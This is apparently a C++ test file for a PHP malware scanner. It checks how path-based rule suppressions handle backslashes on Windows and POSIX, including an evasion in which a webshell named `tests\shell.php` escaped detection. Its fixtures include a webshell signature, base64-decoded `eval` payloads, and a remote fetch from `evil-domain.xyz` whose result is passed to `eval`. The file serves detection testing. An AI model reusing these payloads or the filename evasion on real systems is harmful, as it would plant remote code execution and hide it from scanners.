// The path a context filter sees, and what a backslash in it means on each platform.
//
// THE TWO DEFECTS THESE CASES EXIST FOR
// -------------------------------------
// applyContextFilter suppresses a rule by looking for fragments in the file's path:
// `/vendor/` for vendored crypto under OBF003, `/tests/` for fixtures under BD013, and
// ten more. Every fragment is spelled with forward slashes, and a Windows path arrives
// with the separator Windows gave it. So `\vendor\` never contained `/vendor/`, and
// eleven of the twelve fragments could not fire on Windows at all. Measured over the
// same corpus with both platforms' binaries: detection agreed exactly and the benign
// sweep did not - 47 findings on Windows against 44 on Linux, the extra three being
// OBF003 on a vendored PhpSpreadsheet writer and WS006 on two Magento test fixtures.
//
// The first repair rewrote every backslash to a forward slash on every platform, and
// that was a detection evasion on Linux. POSIX permits a backslash inside a file name,
// so a file NAMED `tests\shell.php` - one file, no directory, named by whoever dropped
// it - was rewritten to `tests/shell.php`, the WS006 fixture suppression found `/tests/`
// in it, and a live webshell signature was dropped: the release binary said exit 2 and
// WS006 for that name and the repaired one said exit 0 and nothing, on identical bytes.
//
// THE ASYMMETRY THAT SETTLES IT
// -----------------------------
// Windows forbids a backslash inside a path component, so on Windows a backslash is
// always a separator and rewriting it is exact. POSIX permits one, so on POSIX it is
// sometimes a character in a name, and rewriting it guesses - in the direction that
// grants a suppression. So match() rewrites under _WIN32 only, and on POSIX the filters
// see the path byte for byte. That is a property of the platform's path grammar, not a
// preference, which is why a platform conditional is the right answer here.
//
// WHAT EACH KIND OF CASE CHECKS, AND ON WHICH PLATFORM
// ----------------------------------------------------
//   filterPath() itself, pinned once and thoroughly on every platform: it is a pure
//     function and the layer, and the two rules the measurement named are not the
//     property.
//   Every fragment through the real rule that owns it, in forward-slash spelling and
//     in backslash spelling put through filterPath() first, on every platform: this is
//     the normalisation meeting the filters, and it does not depend on the binding.
//   The Windows binding: a raw backslash path handed to match() is suppressed. Checked
//     where a backslash is a separator; skips elsewhere, saying so.
//   The POSIX contract, and the regression control for the evasion: a raw backslash
//     path handed to match() still FIRES, and a real file on disk whose name contains a
//     backslash is still scanned and still fires - for every fragment, not only
//     `/tests/`. Checked where a backslash is a name character; skips on Windows, where
//     no such file can exist.
//   The other direction on disk: a genuine directory named `tests` or `vendor` still
//     suppresses, on every platform.
//   Inside an archive, on every platform: a member is judged under the container's real
//     directories and its own stored name, so a genuine directory inside a zip or a tar.gz
//     suppresses as a directory on disk does and the control beside it fires - while a
//     backslash in a member's name and the container's own file name grant nothing, whatever the
//     host byte, a name spelled like Mac or Windows metadata leaves no member shut, and a
//     member's address is its stored name.
//
// Every suppression has a control path that must still fire, because a normalisation
// that suppressed everything would satisfy a one-sided case.

#include <gtest/gtest.h>

#include "config/Config.h"
#include "core/MatchEngine.h"
#include "core/Scanner.h"
#include "infrastructure/PathUtils.h"
#include "infrastructure/ResultPrinter.h"
#include "infrastructure/report/CsvReportWriter.h"
#include "infrastructure/report/JsonReportWriter.h"
#include "system/CliArgs.h"
#include "use-cases/CheckUseCase.h"

#include <nlohmann/json.hpp>

#include "ArchiveFixtures.h"

#include <algorithm>
#include <cstdint>
#include <filesystem>
#include <fstream>
#include <map>
#include <optional>
#include <random>
#include <set>
#include <sstream>
#include <string>
#include <string_view>
#include <vector>

using namespace lyxbosa;

namespace {

namespace fs = std::filesystem;

// The two platform contracts, each stated once so no case can quietly ask a weaker
// question than its neighbours. A case about the Windows binding skips on POSIX with
// the first; a case about a literal backslash in a name skips on Windows with the second.
std::optional<std::string> whyBackslashIsNotASeparatorHere() {
#ifdef _WIN32
    return std::nullopt;
#else
    return "a backslash is a character in a name on this platform and match() does not "
           "rewrite it; the Windows binding is what the Windows job checks";
#endif
}

std::optional<std::string> whyNoNameCanHoldABackslashHere() {
#ifdef _WIN32
    return "Windows forbids a backslash inside a path component, so no file whose name "
           "contains one can exist to be scanned; a backslash here is always a separator";
#else
    return std::nullopt;
#endif
}

// The other spelling of a forward-slash path, so every table row states one spelling
// and the case derives the other rather than a hand-written pair drifting apart.
std::string backslashed(std::string_view path) {
    std::string out(path);
    std::replace(out.begin(), out.end(), '/', '\\');
    return out;
}

// Rule fixtures. Each one matches its rule's pattern and trips none of that rule's
// content-based filters, so the path is the only thing deciding the outcome.

// OBF003: 30 hex digits, and not the rsaEncryption OID the filter always lets through.
constexpr std::string_view kPackHex =
    "<?php\n$bin = pack('H*', '48656c6c6f20576f726c6421486921');\n";

// WS006: the signature and nothing else - the repro's file, byte for byte.
constexpr std::string_view kFilesMan = "<?php\n$auth = \"FilesMan\";\necho $auth;\n";

// OBF002: four chained chr() calls whose values are not an ascending run.
constexpr std::string_view kChrChain =
    "<?php\n$f = chr(112) . chr(104) . chr(112) . chr(95) . chr(117);\n";

// OBF010 / OBF011: decoded straight into eval, with no json_decode or htmlentities in
// reach.
constexpr std::string_view kGzuncompressEval =
    "<?php\n$d = gzuncompress(base64_decode($x));\neval($d);\n";
constexpr std::string_view kRawurldecodeEval =
    "<?php\n$p = rawurldecode(base64_decode($_POST['d']));\neval($p);\n";

// BD013: a private-key marker with key data on the next line, not inside a comment.
constexpr std::string_view kPrivateKey =
    "<?php\n$key = '-----BEGIN RSA PRIVATE KEY-----\n"
    "MIIEpAIBAAKCAQEA0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789\n"
    "-----END RSA PRIVATE KEY-----';\n";

// DRP001: a remote fetch with eval more than 500 bytes away, which is where the vendor
// path skip applies; in reach of the fetch the rule keeps the match whatever the path.
std::string remoteFetchThenDistantEval() {
    std::string s = "<?php\n$code = file_get_contents('https://evil-domain.xyz/p.txt');\n";
    s += std::string(600, ' ');
    s += "\neval($code);\n";
    return s;
}

// OBF036: 800 bytes of uniform pseudo-random content ahead of PHP source - the shape of
// an encrypted stage, and the same generator tests/rules_test.cpp uses for the rule.
std::string blobThenPhp() {
    std::string s;
    uint32_t state = 0x1d0f461cu;
    for (int i = 0; i < 800; ++i) {
        state = state * 1664525u + 1013904223u;
        s.push_back(static_cast<char>((state >> 16) & 0xFF));
    }
    s += "<?php goto vSHrlRg; $x = 1; ?>";
    return s;
}

class PathFilterFixture : public ::testing::Test {
protected:
    MatchEngine engine;

    void SetUp() override { engine.loadAllBuiltinRules(); }

    bool fires(std::string_view rule, std::string_view content, std::string_view path) {
        for (const auto& m : engine.match(content, path)) {
            if (m.category == rule) return true;
        }
        return false;
    }
};

// A real file on disk, read through Scanner::scanFile the way `check` does, so a case
// about a NAME is a case about a name the platform actually stored.
class OnDiskFixture : public PathFilterFixture {
protected:
    fs::path root;

    void SetUp() override {
        PathFilterFixture::SetUp();
        root = fs::temp_directory_path() /
               ("lyxbosa-path-filter-" + std::to_string(std::random_device{}()));
        fs::create_directories(root);
    }
    void TearDown() override {
        std::error_code ec;
        fs::remove_all(root, ec);
    }

    // `relative` is appended as the platform parses it: on POSIX a string with
    // backslashes in it is one file name, on Windows it is directories.
    bool firesOnDisk(std::string_view rule, std::string_view content, std::string_view relative) {
        const fs::path file = root / std::string(relative);
        fs::create_directories(file.parent_path());
        {
            std::ofstream out(file, std::ios::binary | std::ios::trunc);
            EXPECT_TRUE(out.good()) << "could not write " << file;
            out.write(content.data(), static_cast<std::streamsize>(content.size()));
        }

        AppConfig config = Config::loadFromString(Config::generateDefault());
        config.archives.enabled = false;
        config.actions.quarantine.enabled = false;
        Scanner scanner(config);

        const FileResult result = scanner.scanFile(file);
        EXPECT_FALSE(result.skipped()) << file << " was not read";
        for (const auto& m : result.matches) {
            if (m.category == rule) return true;
        }
        return false;
    }
};

}  // namespace

// ===========================================================================
// The normalisation itself - a pure function, the same on every platform
// ===========================================================================

TEST(FilterPathTest, AForwardSlashPathIsReturnedAsItIs) {
    EXPECT_EQ(MatchEngine::filterPath("wp-content/plugins/foo/vendor/lib.php"),
              "wp-content/plugins/foo/vendor/lib.php");
}

TEST(FilterPathTest, EveryBackslashBecomesAForwardSlash) {
    EXPECT_EQ(MatchEngine::filterPath("C:\\sites\\shop\\vendor\\phpoffice\\Xlsx.php"),
              "C:/sites/shop/vendor/phpoffice/Xlsx.php");
}

// The operator can type either separator and the walk spells the rest the way the
// platform does, so one path can carry both. Nothing may assume one form throughout.
TEST(FilterPathTest, AMixedPathIsNormalisedThroughout) {
    EXPECT_EQ(MatchEngine::filterPath("C:\\sites\\shop/wp-content/plugins\\foo\\vendor/lib.php"),
              "C:/sites/shop/wp-content/plugins/foo/vendor/lib.php");
    EXPECT_EQ(MatchEngine::filterPath("wp-content/plugins\\foo/vendor\\lib.php"),
              "wp-content/plugins/foo/vendor/lib.php");
}

// A UNC root and an extended-length prefix are text like any other: the fragments
// still find what they look for after them, and nothing tries to be clever.
TEST(FilterPathTest, RootPrefixesAreSpelledLikeTheRest) {
    EXPECT_EQ(MatchEngine::filterPath("\\\\server\\share\\www\\vendor\\lib.php"),
              "//server/share/www/vendor/lib.php");
    EXPECT_EQ(MatchEngine::filterPath("\\\\?\\C:\\www\\vendor\\lib.php"),
              "//?/C:/www/vendor/lib.php");
}

// The separator is the only byte touched. UTF-8 is safe by construction - 0x5C cannot
// occur inside a multi-byte sequence - and the case says so with every other byte value.
TEST(FilterPathTest, NoOtherByteIsTouched) {
    EXPECT_EQ(MatchEngine::filterPath(""), "");
    EXPECT_EQ(MatchEngine::filterPath("wp-content/uploads/Καλώς/ήρθατε.php"),
              "wp-content/uploads/Καλώς/ήρθατε.php");

    std::string everyOtherByte;
    for (int b = 1; b < 256; ++b) {
        if (b != '\\') everyOtherByte.push_back(static_cast<char>(b));
    }
    EXPECT_EQ(MatchEngine::filterPath(everyOtherByte), everyOtherByte);
}

// ===========================================================================
// The two Windows findings and the one Linux evasion, by shape
// ===========================================================================

class PathSuppressionTest : public PathFilterFixture {};

// Any platform: once a path is in filter spelling, the vendored writer is suppressed
// under either original spelling and a mixed one.
TEST_F(PathSuppressionTest, OBF003_AVendoredWriterIsSuppressedOnceInFilterSpelling) {
    const std::string forward =
        "wp-content/plugins/shop/vendor/phpoffice/phpspreadsheet/src/PhpSpreadsheet/Writer/Xlsx.php";
    EXPECT_FALSE(fires("OBF003", kPackHex, forward));
    EXPECT_FALSE(fires("OBF003", kPackHex, MatchEngine::filterPath(backslashed(forward))));
    EXPECT_FALSE(fires("OBF003", kPackHex, MatchEngine::filterPath(
                           "C:\\sites\\shop/wp-content/plugins\\shop\\vendor/phpoffice/Xlsx.php")))
        << "a root typed one way and walked the other";
}

// Windows: the raw path reaches the filters normalised, so the 47th finding is gone.
TEST_F(PathSuppressionTest, OBF003_OnWindowsTheRawBackslashPathIsSuppressedByTheBinding) {
    if (const auto why = whyBackslashIsNotASeparatorHere()) GTEST_SKIP() << *why;
    EXPECT_FALSE(fires("OBF003", kPackHex,
                       "C:\\sites\\shop\\wp-content\\plugins\\shop\\vendor\\phpoffice\\Xlsx.php"))
        << "the 47th finding on Windows: \\vendor\\ never contained /vendor/";
}

// POSIX: the same string is one file name, and a name grants nothing.
TEST_F(PathSuppressionTest, OBF003_OnPosixAFileNamedWithBackslashesIsNotVendored) {
    if (const auto why = whyNoNameCanHoldABackslashHere()) GTEST_SKIP() << *why;
    EXPECT_TRUE(fires("OBF003", kPackHex, "wp-content\\plugins\\shop\\vendor\\phpoffice\\Xlsx.php"))
        << "a file NAMED with \\vendor\\ in it is not under vendor/";
}

// Any platform: outside a vendor tree it fires under every spelling, normalised or raw.
TEST_F(PathSuppressionTest, OBF003_StillFiresOutsideAVendorTreeHoweverThePathIsSpelled) {
    const std::string forward = "wp-content/uploads/2026/09/cache.php";
    EXPECT_TRUE(fires("OBF003", kPackHex, forward));
    EXPECT_TRUE(fires("OBF003", kPackHex, MatchEngine::filterPath(backslashed(forward))));
    EXPECT_TRUE(fires("OBF003", kPackHex, backslashed(forward)));
}

// WS006 no longer has a path suppression at all - a signature's verdict is a function
// of the bytes, see LocationPriorTest - so the two Magento-fixture cases that stood here
// are gone with it. What remains is the evasion control, which is now true for every
// spelling rather than only for the backslash one.

// THE EVASION, by shape: the repro's second file. One name in an uploads directory,
// chosen by whoever dropped the shell. It must fire.
TEST_F(PathSuppressionTest, WS006_OnPosixAFileNamedTestsBackslashShellIsStillAWebshell) {
    if (const auto why = whyNoNameCanHoldABackslashHere()) GTEST_SKIP() << *why;
    EXPECT_TRUE(fires("WS006", kFilesMan, "wp-content/uploads/tests\\shell.php"))
        << "a file NAMED tests\\shell.php is not a fixture under tests/";
    EXPECT_TRUE(fires("WS006", kFilesMan, "tests\\shell.php"));
}

TEST_F(PathSuppressionTest, WS006_StillFiresOutsideATestTreeHoweverThePathIsSpelled) {
    const std::string forward = "wp-content/uploads/shell.php";
    EXPECT_TRUE(fires("WS006", kFilesMan, forward));
    EXPECT_TRUE(fires("WS006", kFilesMan, MatchEngine::filterPath(backslashed(forward))));
    EXPECT_TRUE(fires("WS006", kFilesMan, backslashed(forward)));
}

// ===========================================================================
// Every fragment, through the rule that owns it
// ===========================================================================
//
// One row per rule: the content that fires it, every forward-slash path that must
// suppress it, and one path that must not. The cases derive the backslash spelling of
// each. A separator is what these cases are about; every fragment is now a directory
// name (see LocationPriorTest, which covers each one in every spelling), and WS006 has
// no row because a signature has no location prior.

namespace {

struct FragmentCase {
    const char* rule;
    std::string content;
    std::vector<const char*> suppressed;
    const char* control;
};

std::ostream& operator<<(std::ostream& os, const FragmentCase& c) { return os << c.rule; }

const std::vector<FragmentCase> kFragmentCases = {
    {"OBF003", std::string(kPackHex),
     {"wp-content/plugins/foo/vendor/lib/x.php",                    // /vendor/
      "wp-content/plugins/google-site-kit/third-party/lib/x.php",   // third-party/
      "wp-content/plugins/foo/third_party/lib/x.php",               // third_party/
      "wp-content/plugins/wpforms/vendor-prefixed/lib/x.php",       // vendor-prefixed/
      "wp-content/plugins/foo/lib/crypt/x.php"},                    // /crypt/
     "wp-content/uploads/x.php"},
    {"OBF002", std::string(kChrChain),
     {"wp-content/plugins/foo/vendor/doctrine/inflector/x.php",     // /vendor/
      "src/tests/x.php",                                            // /tests/
      "src/test/x.php"},                                            // /test/
     "wp-content/uploads/x.php"},
    {"OBF010", std::string(kGzuncompressEval),
     {"wp-content/plugins/foo/vendor/lib/x.php",                    // vendor/
      "wp-content/plugins/foo/vendor-prefixed/lib/x.php"},          // vendor-prefixed/
     "wp-content/uploads/x.php"},
    {"OBF011", std::string(kRawurldecodeEval),
     {"wp-content/plugins/foo/vendor/lib/x.php",                    // vendor/
      "wp-content/plugins/foo/vendor-prefixed/lib/x.php"},          // vendor-prefixed/
     "wp-content/uploads/cache.php"},
    {"DRP001", remoteFetchThenDistantEval(),
     {"wp-content/plugins/foo/vendor/lib/x.php",                    // vendor/
      "wp-content/plugins/foo/vendor-prefixed/lib/x.php"},          // vendor-prefixed/
     "wp-content/uploads/loader.php"},
    {"BD013", std::string(kPrivateKey),
     {"src/tests/keys/private.php",                                 // /tests/
      "src/test/keys/private.php",                                  // /test/
      "src/fixtures/private.php",                                   // /fixtures/
      "src/fixture/private.php",                                    // /fixture/
      "home/deploy/.ssh/id_rsa"},                                   // /.ssh/
     "wp-content/uploads/c2.php"},
    {"OBF036", blobThenPhp(),
     {"wp-content/wflogs/rules.php"},                               // /wflogs/
     "wp-content/uploads/stage.php"},
};

}  // namespace

class EveryPathFragmentTest : public PathFilterFixture,
                              public ::testing::WithParamInterface<FragmentCase> {};

// Any platform. The forward spelling is the contract the filters always had; the
// backslash spelling put through filterPath() first is the normalisation meeting them,
// checked without the binding being live.
TEST_P(EveryPathFragmentTest, SuppressesInFilterSpellingAndTheControlFires) {
    const FragmentCase& c = GetParam();

    for (const char* path : c.suppressed) {
        EXPECT_FALSE(fires(c.rule, c.content, path))
            << c.rule << " should be suppressed under " << path;
        EXPECT_FALSE(fires(c.rule, c.content, MatchEngine::filterPath(backslashed(path))))
            << c.rule << " should be suppressed under filterPath(" << backslashed(path) << ")";
    }

    EXPECT_TRUE(fires(c.rule, c.content, c.control))
        << c.rule << " must still fire under " << c.control;
    EXPECT_TRUE(fires(c.rule, c.content, MatchEngine::filterPath(backslashed(c.control))))
        << c.rule << " must still fire under filterPath(" << backslashed(c.control) << ")"
        << " - a normalisation that suppressed everything would pass the rest of this case";
}

// Windows only: a raw backslash path handed to match() is what the walk hands it, and
// the binding must normalise it before the filters run.
TEST_P(EveryPathFragmentTest, OnWindowsARawBackslashPathIsSuppressedByTheBinding) {
    if (const auto why = whyBackslashIsNotASeparatorHere()) GTEST_SKIP() << *why;
    const FragmentCase& c = GetParam();

    for (const char* path : c.suppressed) {
        EXPECT_FALSE(fires(c.rule, c.content, backslashed(path)))
            << c.rule << " should be suppressed under " << backslashed(path);
    }
    EXPECT_TRUE(fires(c.rule, c.content, backslashed(c.control)))
        << c.rule << " must still fire under " << backslashed(c.control);
}

// POSIX only: the same string is one file name, and match() must not rewrite it. Every
// fragment, because every one of them became claimable by a name when the rewrite was
// unconditional - not only /tests/.
TEST_P(EveryPathFragmentTest, OnPosixARawBackslashPathIsOneNameAndGrantsNothing) {
    if (const auto why = whyNoNameCanHoldABackslashHere()) GTEST_SKIP() << *why;
    const FragmentCase& c = GetParam();

    for (const char* path : c.suppressed) {
        EXPECT_TRUE(fires(c.rule, c.content, backslashed(path)))
            << c.rule << " was suppressed for a file NAMED " << backslashed(path)
            << " - a backslash in a name is not a separator on this platform";
    }
    EXPECT_TRUE(fires(c.rule, c.content, backslashed(c.control)));
}

class EveryPathFragmentOnDiskTest : public OnDiskFixture,
                                    public ::testing::WithParamInterface<FragmentCase> {};

// THE REGRESSION CONTROL. POSIX only: a real file whose NAME contains backslashes, read
// through the scanner the way `check` reads it, still fires the rule it should. This is
// the case that would have caught the evasion: with the rewrite unconditional, every
// row here fails.
TEST_P(EveryPathFragmentOnDiskTest, OnPosixAFileNamedWithBackslashesIsStillScannedAndFires) {
    if (const auto why = whyNoNameCanHoldABackslashHere()) GTEST_SKIP() << *why;
    const FragmentCase& c = GetParam();

    for (const char* path : c.suppressed) {
        EXPECT_TRUE(firesOnDisk(c.rule, c.content, backslashed(path)))
            << c.rule << " was not reported for a file named " << backslashed(path);
    }
    EXPECT_TRUE(firesOnDisk(c.rule, c.content, backslashed(c.control)));
}

// The other direction, any platform: a genuine directory named tests, vendor, .ssh or
// wflogs still suppresses on disk, and the control beside it still fires.
TEST_P(EveryPathFragmentOnDiskTest, AGenuineDirectoryStillSuppressesOnDisk) {
    const FragmentCase& c = GetParam();

    for (const char* path : c.suppressed) {
        EXPECT_FALSE(firesOnDisk(c.rule, c.content, path))
            << c.rule << " should be suppressed under a real " << path;
    }
    EXPECT_TRUE(firesOnDisk(c.rule, c.content, c.control))
        << c.rule << " must still fire under a real " << c.control;
}

INSTANTIATE_TEST_SUITE_P(Fragments, EveryPathFragmentTest, ::testing::ValuesIn(kFragmentCases),
                         [](const ::testing::TestParamInfo<FragmentCase>& info) {
                             return std::string(info.param.rule);
                         });
INSTANTIATE_TEST_SUITE_P(Fragments, EveryPathFragmentOnDiskTest,
                         ::testing::ValuesIn(kFragmentCases),
                         [](const ::testing::TestParamInfo<FragmentCase>& info) {
                             return std::string(info.param.rule);
                         });

// ===========================================================================
// Every fragment, inside an archive
// ===========================================================================
//
// A member is matched under its address, `<archive>!<member>`, and that address is the path
// the fragments are tested against: a vendored library inside a site backup is judged as the
// loose copy of it is. Each row's content goes into one archive under every path the row
// suppresses and under its control path, and the archive is scanned the way `scan` scans it.
//
// No suppressed path starts with its fragment. The address has no separator after `!`, so a
// member's first component is spelled together with the archive's own name and is not a
// directory the filters can see.

namespace {

using lyxbosa::test::fixtures::appendTarMember;
using lyxbosa::test::fixtures::endOfTar;
using lyxbosa::test::fixtures::gzipCompress;
using lyxbosa::test::fixtures::hostBytesOf;
using lyxbosa::test::fixtures::writeZip;

// The three shapes a site backup arrives in: a zip written on Unix, a zip written on Windows,
// and a tar.gz, whose headers name no writer.
enum class Container { UnixZip, DosZip, TarGz };

const char* containerName(Container container) {
    switch (container) {
        case Container::UnixZip: return "unix-host.zip";
        case Container::DosZip:  return "dos-host.zip";
        case Container::TarGz:   return "backup.tar.gz";
    }
    return "?";
}

class ArchiveMemberFixture : public OnDiskFixture {
protected:
    // `members` written as one archive of `container`, scanned, and the rules raised against
    // each member, keyed by the name as stored. `opened` members must have been read, all of
    // them unless the case says otherwise: a finding missing from a member nobody read would
    // prove nothing about a suppression. `label` keeps two archives of one case apart.
    std::map<std::string, std::set<std::string>> scanMembers(
        Container container, const std::vector<std::pair<std::string, std::string>>& members,
        std::optional<size_t> opened = std::nullopt, const std::string& label = "",
        const std::vector<std::string>& excludeUnderArchiveDirectory = {}) {
        const fs::path dir = root / (label + containerName(container));
        fs::create_directories(dir);
        const fs::path archive = dir / containerName(container);

        if (container == Container::TarGz) {
            std::string tar;
            for (const auto& [name, body] : members) {
                appendTarMember(tar, name, body);
            }
            tar += endOfTar();
            const std::string bytes = gzipCompress(tar);
            std::ofstream out(archive, std::ios::binary);
            out.write(bytes.data(), static_cast<std::streamsize>(bytes.size()));
        } else {
            const uint8_t host = container == Container::DosZip ? ZIP_OPSYS_DOS : ZIP_OPSYS_UNIX;
            writeZip(archive, members, host);
            for (const auto& [name, byte] : hostBytesOf(archive)) {
                EXPECT_EQ(byte, host) << "the fixture does not carry the host byte it claims";
            }
        }

        AppConfig config = Config::loadFromString(Config::generateDefault());
        config.scan.directories = {pathToUtf8(dir)};
        config.scan.recursive = true;
        config.actions.quarantine.enabled = false;
        for (const auto& pattern : excludeUnderArchiveDirectory) {
            config.scan.exclude.push_back(diskPathWithSlashes(pathToUtf8(dir)) + "/" + pattern);
        }
        Scanner scanner(config);
        scanner.setPreCount(false);
        const ScanResult result = scanner.scan();
        EXPECT_EQ(result.archives.membersScanned, opened.value_or(members.size()))
            << containerName(container) << ": not the members this case expects were opened";

        // Keyed by the address a row carries, which is the stored name, compared as a string:
        // on Windows two paths spelled with either separator compare equal.
        std::map<std::string, std::set<std::string>> raised;
        for (const auto& [name, body] : members) {
            const std::string address = pathToUtf8(archive) + "!" + name;
            auto& codes = raised[name];
            for (const auto& file : result.files) {
                if (pathToUtf8(file.path) != address) continue;
                for (const auto& match : file.matches) {
                    codes.insert(match.category);
                }
            }
        }
        return raised;
    }
};

class EveryPathFragmentInAnArchiveTest : public ArchiveMemberFixture,
                                         public ::testing::WithParamInterface<FragmentCase> {};

}  // namespace

// Any platform, any writer: a genuine directory inside an archive suppresses exactly as the
// same directory on disk does, and the control path beside it in the same archive fires.
TEST_P(EveryPathFragmentInAnArchiveTest, AGenuineDirectoryInsideAnArchiveStillSuppresses) {
    const FragmentCase& c = GetParam();

    std::vector<std::pair<std::string, std::string>> members;
    for (const char* path : c.suppressed) {
        members.emplace_back(path, c.content);
    }
    members.emplace_back(c.control, c.content);

    for (const Container container : {Container::UnixZip, Container::DosZip, Container::TarGz}) {
        SCOPED_TRACE(containerName(container));
        auto raised = scanMembers(container, members);
        for (const char* path : c.suppressed) {
            EXPECT_EQ(raised[path].count(c.rule), 0u)
                << c.rule << " should be suppressed for a member under " << path;
        }
        EXPECT_EQ(raised[c.control].count(c.rule), 1u)
            << c.rule << " must still fire for a member at " << c.control;
    }
}

INSTANTIATE_TEST_SUITE_P(Fragments, EveryPathFragmentInAnArchiveTest,
                         ::testing::ValuesIn(kFragmentCases),
                         [](const ::testing::TestParamInfo<FragmentCase>& info) {
                             return std::string(info.param.rule);
                         });

// ===========================================================================
// A member NAMED with backslashes is not under a directory
// ===========================================================================
//
// The shape: a file whose name holds backslashes, as POSIX lets anybody who can write one
// file name it, carried into a site backup by a trusted archiver running on Linux. PHP's
// ZipArchive, Info-ZIP zip, 7-Zip, Python and Go's FileInfoHeader store that name under host
// byte 3 (Unix); Go's Create() stores it under host byte 0 (MS-DOS); GNU tar stores it with no
// writer to ask. Every Linux extractor measured but one - PHP's extractTo, WordPress's
// unzip_file on ZipArchive and on PclZip, Python, 7-Zip, GNU tar - recreates it as ONE file
// whose name holds the backslashes, which the scan of the loose file reports. So no host byte
// makes a backslash a directory for a location prior or a pattern, and the scan of the backup
// judges the member as the scan of the file judges the file.

namespace {

// Every separator after the first rewritten to a backslash: the first component stays a real
// directory, and everything below it is one name.
std::string backslashedAfterFirst(std::string_view path) {
    std::string out(path);
    const size_t slash = out.find('/');
    if (slash != std::string::npos) {
        std::replace(out.begin() + static_cast<std::ptrdiff_t>(slash) + 1, out.end(), '/', '\\');
    }
    return out;
}

}  // namespace

TEST_P(EveryPathFragmentInAnArchiveTest, AMemberNamedWithBackslashesByALinuxArchiverStillFires) {
    const FragmentCase& c = GetParam();

    // A path whose file has no extension of its own is left out. Named with backslashes it has
    // one - `deploy\.ssh\id_rsa` ends in `.ssh\id_rsa` - which the include list does not
    // name, so it is not opened, in an archive or on disk: a walk of that one file reports FN002
    // and leaves it shut. That is the include list's answer, not a directory's.
    std::vector<std::pair<std::string, std::string>> members;
    for (const char* path : c.suppressed) {
        if (fs::path(path).extension().empty()) continue;
        members.emplace_back(backslashedAfterFirst(path), c.content);
    }
    members.emplace_back(c.control, c.content);

    for (const Container container : {Container::UnixZip, Container::DosZip, Container::TarGz}) {
        SCOPED_TRACE(containerName(container));
        auto raised = scanMembers(container, members);
        for (const auto& [name, body] : members) {
            EXPECT_EQ(raised[name].count(c.rule), 1u)
                << c.rule << " was suppressed for a member NAMED " << name;
        }
    }
}

// A member is asked the operator's patterns at the path it has beside its archive - the
// archive's directory on disk, then the stored name - exactly as the file of that name in that
// directory is asked them. So the default `vendor/**`, which names nothing on disk because a
// file's path is absolute, names nothing inside an archive either; and a pattern that does name
// the archive's `vendor/` - written from the archive's own directory - excludes a member under
// a genuine `vendor/` directory, not a member NAMED `vendor\w.php`, and not one two directories
// down, because `**` stops at a `/` on every platform, as fnmatch(3) with FNM_PATHNAME stops it.
class ArchiveMemberExcludeTest : public ArchiveMemberFixture {};

TEST_F(ArchiveMemberExcludeTest, AMemberNamedWithBackslashesIsNotInAnExcludedDirectory) {
    const std::string content(kFilesMan);
    for (const Container container : {Container::UnixZip, Container::DosZip, Container::TarGz}) {
        SCOPED_TRACE(containerName(container));
        auto byDefault = scanMembers(container,
                                     {{"vendor\\w.php", content}, {"vendor/w.php", content},
                                      {"vendor/lib/w.php", content}},
                                     std::nullopt, "default-");
        EXPECT_EQ(byDefault["vendor/w.php"].count("WS006"), 1u)
            << "the default `vendor/**` excluded a member it names nothing beside on disk";
        EXPECT_EQ(byDefault["vendor\\w.php"].count("WS006"), 1u);
        EXPECT_EQ(byDefault["vendor/lib/w.php"].count("WS006"), 1u);

        auto named = scanMembers(container, {{"vendor\\w.php", content}, {"ok.php", content}},
                                 std::nullopt, "named-", {"vendor/**"});
        EXPECT_EQ(named["vendor\\w.php"].count("WS006"), 1u)
            << "a member NAMED vendor\\w.php was excluded as though vendor/ were a directory";
        EXPECT_EQ(named["ok.php"].count("WS006"), 1u);

        auto genuine = scanMembers(container, {{"vendor/w.php", content}, {"ok.php", content}},
                                   size_t{1}, "genuine-", {"vendor/**"});
        EXPECT_TRUE(genuine["vendor/w.php"].empty()) << "the exclude no longer reaches vendor/";
        EXPECT_EQ(genuine["ok.php"].count("WS006"), 1u);

        auto deeper = scanMembers(container, {{"vendor/lib/w.php", content}, {"ok.php", content}},
                                  std::nullopt, "deeper-", {"vendor/**"});
        EXPECT_EQ(deeper["vendor/lib/w.php"].count("WS006"), 1u)
            << "vendor/** excluded a member two directories down; `**` crossed a `/`";
    }
}

// ===========================================================================
// A member's address is its stored name
// ===========================================================================
//
// Two members the archive holds apart are two rows, in every report and in `check`, each
// addressed by the name the archive stores. `src\vendor\x.php` and `src/vendor/x.php` are
// different entries - one of them, on Linux, extracts to a single file with backslashes in
// its name - and so are `./src/x.php` and `src/x.php`. The content is the WS006 signature,
// which no location prior drops, so every one of the four is a row whatever it is called.

class ArchiveMemberAddressTest : public ArchiveMemberFixture {};

TEST_F(ArchiveMemberAddressTest, MembersTheArchiveHoldsApartAreNeverOneAddress) {
    const std::string content(kFilesMan);
    const std::vector<std::pair<std::string, std::string>> members = {
        {"src\\vendor\\x.php", content},
        {"src/vendor/x.php", content},
        {"./src/x.php", content},
        {"src/x.php", content},
    };

    for (const Container container : {Container::UnixZip, Container::DosZip, Container::TarGz}) {
        SCOPED_TRACE(containerName(container));
        auto raised = scanMembers(container, members);
        for (const auto& [name, body] : members) {
            EXPECT_EQ(raised[name].count("WS006"), 1u) << "no row addressed " << name;
        }

        const fs::path archive = root / containerName(container) / containerName(container);
        std::vector<std::string> addresses;
        for (const auto& [name, body] : members) {
            addresses.push_back(pathForDisplay(pathFromUtf8(pathToUtf8(archive) + "!" + name)));
        }

        AppConfig config = Config::loadFromString(Config::generateDefault());
        config.scan.directories = {pathToUtf8(archive.parent_path())};
        config.actions.quarantine.enabled = false;
        Scanner scanner(config);
        scanner.setPreCount(false);
        const ScanResult result = scanner.scan();

        std::ostringstream json;
        {
            JsonReportWriter writer(json);
            writer.begin();
            for (const auto& file : result.files) writer.onFile(file);
            writer.end(result, false);
        }
        const nlohmann::json document = nlohmann::json::parse(json.str());
        std::set<std::string> jsonPaths;
        for (const auto& file : document.at("files")) {
            jsonPaths.insert(file["path"].get<std::string>());
        }
        for (const auto& address : addresses) {
            EXPECT_EQ(jsonPaths.count(address), 1u) << "JSON has no row addressed " << address;
        }
        EXPECT_EQ(jsonPaths.size(), members.size()) << json.str();

        std::ostringstream csv;
        {
            CsvReportWriter writer(csv);
            writer.begin();
            for (const auto& file : result.files) writer.onFile(file);
            writer.end(result, false);
        }
        std::ostringstream text;
        {
            ResultPrinter printer(text, /*color=*/false, /*width=*/400);
            for (const auto& file : result.files) printer.printFileResult(file);
        }

        CliArgs args;
        args.checkFile = pathToUtf8(archive);
